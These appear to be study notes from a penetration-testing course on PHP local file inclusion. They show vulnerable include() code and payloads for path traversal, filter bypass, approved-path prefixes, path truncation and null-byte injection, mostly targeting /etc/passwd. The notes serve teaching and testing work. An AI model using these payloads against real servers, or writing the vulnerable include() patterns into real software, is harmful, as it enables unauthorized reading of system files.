# Basic Techniques

## Basic LFI

You can specify the absolute path in the GET parameter if the whole input is passed to the include() function without additions like that:
```php
include($_GET['language']);
```

## Path Traversal

We can traverse several directories back with `../` when the parameter is added after a directory:
```php
include("./languages/" . $_GET['language']);
```

## Filename Prefix

Our input sometimes may be appended to a prefix:
```php
include("lang_" . $_GET['language']);
```

You can add `/` before the input so the prefix would be considered as a directory, only works if the prefix exists as a directory.

## Second Order Attacks

A web app can let us pull files from a back-end server, for example with `/profile/$username/avatar.png`, in this case we can change the username parameter to grab another local file from the server instead of the avatar.

# Basic Bypass

## Non-Recursive Path Traversal Filters

Basic filter to replace substrings of `../`:
```php
$language = str_replace('../', '', $_GET['language']);
```

We can use `....//`, `..././`, `....\/`, `....////` or others in a case like above where the filter doesn't remove the substrings recursively.

## Encoding

We can use online URL encoders or burp Decoder to by pass filters of characters like `.` and `/`.

## Approved Paths

Some applications may use regular expressions that a file being included is in a specific path:
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

We can start our payload with the approved path like `./languages/../../../../etc/passwd`.

## Appended Extension

An extension may be appended to the input:
```php
include($_GET['language'] . ".php");
```

The next techniques will only work with PHP versions before 5.3/5.4.

### Path Truncation

PHP accepted a maximum length of 4096 characters and truncated the rest, it also removed trailing `/` and `.`, disregarded multiple '/' in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`) a current directory shortcut (`.`) in the middle of the path.

We will need to start the input with non existing directory and make a long input which will be truncated along with the `.php` at the end:
```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

A script to automate the creation of the input:
```shell-session
Wildland4958@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

### Bull Bytes

PHP versions before 5.5 ignored everything after null bytes, so we can add `%00` to the end of the payload so the `.php` at the end will be truncated.